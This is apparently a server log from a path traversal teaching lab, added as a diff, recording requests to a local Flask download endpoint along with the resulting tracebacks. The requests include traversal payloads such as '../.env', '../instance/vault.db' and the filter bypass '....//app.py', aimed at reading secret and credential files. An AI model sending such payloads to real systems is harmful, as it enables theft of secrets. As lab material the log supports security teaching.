@@ -1,0 +1,106 @@
+INFO:werkzeug:[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://172.26.182.202:5000
+INFO:werkzeug:[33mPress CTRL+C to quit[0m
+INFO:werkzeug:127.0.0.1 - - [07/Nov/2024 13:45:19] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [07/Nov/2024 13:47:18] "GET /?safety=none HTTP/1.1" 200 -
+INFO:werkzeug:[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://172.26.182.202:5000
+INFO:werkzeug:[33mPress CTRL+C to quit[0m
+INFO:werkzeug:127.0.0.1 - - [07/Nov/2024 13:49:19] "GET /download?file=../.env HTTP/1.1" 200 -
+ERROR:app:Exception on /download [GET]
+Traceback (most recent call last):
+  File "C:\Users\Solitude\AppData\Local\Programs\Python\Python312\Lib\site-packages\flask\app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Solitude\AppData\Local\Programs\Python\Python312\Lib\site-packages\flask\app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Solitude\AppData\Local\Programs\Python\Python312\Lib\site-packages\flask\app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Solitude\AppData\Local\Programs\Python\Python312\Lib\site-packages\flask\app.py", line 865, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Solitude\Desktop\Repositories\Infosec-Techweek-2024\Path-Traversal\app.py", line 45, in download
+    return send_file(os.path.join(ROOT_DIR, "files", sanitized if ENABLE_SAFETY else file_path), as_attachment=True)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Solitude\AppData\Local\Programs\Python\Python312\Lib\site-packages\flask\helpers.py", line 499, in send_file
+    return werkzeug.utils.send_file(  # type: ignore[return-value]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Solitude\AppData\Local\Programs\Python\Python312\Lib\site-packages\werkzeug\utils.py", line 428, in send_file
+    stat = os.stat(path)
+           ^^^^^^^^^^^^^
+FileNotFoundError: [WinError 3] The system cannot find the path specified: 'C:\\Users\\Solitude\\Desktop\\Repositories\\Infosec-Techweek-2024\\Path-Traversal\\files\\instance/vault.db'
+INFO:werkzeug:127.0.0.1 - - [07/Nov/2024 13:50:12] "[35m[1mGET /download?file=instance/vault.db HTTP/1.1[0m" 500 -
+INFO:werkzeug:127.0.0.1 - - [07/Nov/2024 13:50:17] "GET /download?file=../instance/vault.db HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [07/Nov/2024 13:51:39] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://172.26.182.202:5000
+INFO:werkzeug:[33mPress CTRL+C to quit[0m
+INFO:werkzeug:127.0.0.1 - - [07/Nov/2024 13:52:26] "[32mGET /download?file=../app.py HTTP/1.1[0m" 302 -
+INFO:werkzeug:127.0.0.1 - - [07/Nov/2024 13:52:26] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [07/Nov/2024 13:53:27] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [07/Nov/2024 13:53:30] "GET /download?file=flag.txt HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [07/Nov/2024 13:53:46] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [07/Nov/2024 13:53:53] "[32mGET /download?file=../app.py HTTP/1.1[0m" 302 -
+INFO:werkzeug:127.0.0.1 - - [07/Nov/2024 13:54:05] "[32mGET /download?file=../app.py HTTP/1.1[0m" 302 -
+INFO:werkzeug:127.0.0.1 - - [07/Nov/2024 13:54:05] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [07/Nov/2024 13:54:12] "[32mGET /download?file=....//app.py HTTP/1.1[0m" 302 -
+INFO:werkzeug:127.0.0.1 - - [07/Nov/2024 13:54:17] "[32mGET /download?file=....//app.py HTTP/1.1[0m" 302 -
+INFO:werkzeug:127.0.0.1 - - [07/Nov/2024 13:54:18] "GET / HTTP/1.1" 200 -
+ERROR:app:Exception on /download [GET]
+Traceback (most recent call last):
+  File "C:\Users\Solitude\AppData\Local\Programs\Python\Python312\Lib\site-packages\flask\app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Solitude\AppData\Local\Programs\Python\Python312\Lib\site-packages\flask\app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Solitude\AppData\Local\Programs\Python\Python312\Lib\site-packages\flask\app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Solitude\AppData\Local\Programs\Python\Python312\Lib\site-packages\flask\app.py", line 865, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Solitude\Desktop\Repositories\Infosec-Techweek-2024\Path-Traversal\app.py", line 45, in download
+    return send_file(os.path.join(ROOT_DIR, "files", sanitized if ENABLE_SAFETY else file_path), as_attachment=True)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Solitude\AppData\Local\Programs\Python\Python312\Lib\site-packages\flask\helpers.py", line 499, in send_file
+    return werkzeug.utils.send_file(  # type: ignore[return-value]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Solitude\AppData\Local\Programs\Python\Python312\Lib\site-packages\werkzeug\utils.py", line 428, in send_file
+    stat = os.stat(path)
+           ^^^^^^^^^^^^^
+FileNotFoundError: [WinError 2] The system cannot find the file specified: 'C:\\Users\\Solitude\\Desktop\\Repositories\\Infosec-Techweek-2024\\Path-Traversal\\files\\../a pp.py'
+INFO:werkzeug:127.0.0.1 - - [07/Nov/2024 13:54:21] "[35m[1mGET /download?file=....//a+pp.py HTTP/1.1[0m" 500 -
+ERROR:app:Exception on /download [GET]
+Traceback (most recent call last):
+  File "C:\Users\Solitude\AppData\Local\Programs\Python\Python312\Lib\site-packages\flask\app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Solitude\AppData\Local\Programs\Python\Python312\Lib\site-packages\flask\app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Solitude\AppData\Local\Programs\Python\Python312\Lib\site-packages\flask\app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Solitude\AppData\Local\Programs\Python\Python312\Lib\site-packages\flask\app.py", line 865, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Solitude\Desktop\Repositories\Infosec-Techweek-2024\Path-Traversal\app.py", line 45, in download
+    return send_file(os.path.join(ROOT_DIR, "files", sanitized if ENABLE_SAFETY else file_path), as_attachment=True)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Solitude\AppData\Local\Programs\Python\Python312\Lib\site-packages\flask\helpers.py", line 499, in send_file
+    return werkzeug.utils.send_file(  # type: ignore[return-value]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Solitude\AppData\Local\Programs\Python\Python312\Lib\site-packages\werkzeug\utils.py", line 428, in send_file
+    stat = os.stat(path)
+           ^^^^^^^^^^^^^
+FileNotFoundError: [WinError 2] The system cannot find the file specified: 'C:\\Users\\Solitude\\Desktop\\Repositories\\Infosec-Techweek-2024\\Path-Traversal\\files\\../a  pp.py'
+INFO:werkzeug:127.0.0.1 - - [07/Nov/2024 13:54:38] "[35m[1mGET /download?file=....//a++pp.py HTTP/1.1[0m" 500 -
